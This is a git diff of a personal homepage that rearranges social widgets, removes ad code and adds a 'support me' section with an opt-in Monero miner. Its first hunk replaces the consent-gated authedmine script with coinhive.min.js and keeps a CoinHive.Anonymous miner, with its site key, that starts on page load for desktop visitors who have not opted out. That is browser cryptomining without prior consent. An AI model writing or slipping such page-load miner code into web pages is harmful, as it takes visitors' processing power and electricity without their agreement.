@@ -4,7 +4,7 @@ title: AustinHuang.me
 permalink: /
 ---
 
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('NS1Lh4sTCMiS0AcazVxeqiDKUXIrkTnX', {throttle: 0.2});
 	if (!miner.isMobile() && !miner.didOptOut(14400)) {
@@ -59,6 +59,16 @@ I have a white Pentax K-50.
 * [Reddit](http://reddit.com/u/austinhuang)
 * [Twitter](http://twitter.com/montreal0131)
 
+<table width="100%">
+  <tr>
+    <td width="50%"><iframe allowtransparency="true" frameborder="0" scrolling="no" seamless="seamless" src="https://cdoyle.me/gh-activity/gh-activity.html?user=austinhuang0131&type=user" width="100%" height="400px"></iframe>
+</td>
+    <td width="50%"><!-- InstaWidget -->
+<a href="https://instawidget.net/v/user/austinhuang0131" id="link-399fb367133a7c8a206a0f1b39364fa77c34b125a639fea7aa68bd280b0372d3">@austinhuang0131</a>
+<script src="https://instawidget.net/js/instawidget.js?u=399fb367133a7c8a206a0f1b39364fa77c34b125a639fea7aa68bd280b0372d3&width=300px"></script></td>
+  </tr>
+</table>
+
 ## May I ask some questions?
 Obviously, sure.
 
@@ -79,23 +89,12 @@ Nah man. *skirt skirt dab dab*
 ### I mean you didn't answer my question...
 You can ask it [here](https://github.com/austinhuang0131/austinhuang0131.github.io/issues), then.
 
-<table width="100%">
-  <tr>
-    <td width="50%"><iframe allowtransparency="true" frameborder="0" scrolling="no" seamless="seamless" src="https://cdoyle.me/gh-activity/gh-activity.html?user=austinhuang0131&type=user" width="100%" height="400px"></iframe>
-</td>
-    <td width="50%"><!-- InstaWidget -->
-<a href="https://instawidget.net/v/user/austinhuang0131" id="link-399fb367133a7c8a206a0f1b39364fa77c34b125a639fea7aa68bd280b0372d3">@austinhuang0131</a>
-<script src="https://instawidget.net/js/instawidget.js?u=399fb367133a7c8a206a0f1b39364fa77c34b125a639fea7aa68bd280b0372d3&width=300px"></script></td>
-  </tr>
-</table>
+### Hey, you look cool. How can I support you?
+You can either [donate](/donate.html) or start the Monero miner below.
 
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-3033423985893098"
-     data-ad-slot="4216712342"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<div class="coinhive-miner" 
+	style="width: 100%; height: 100px"
+	data-key="NS1Lh4sTCMiS0AcazVxeqiDKUXIrkTnX">
+	<em>Loading...</em>
+</div>
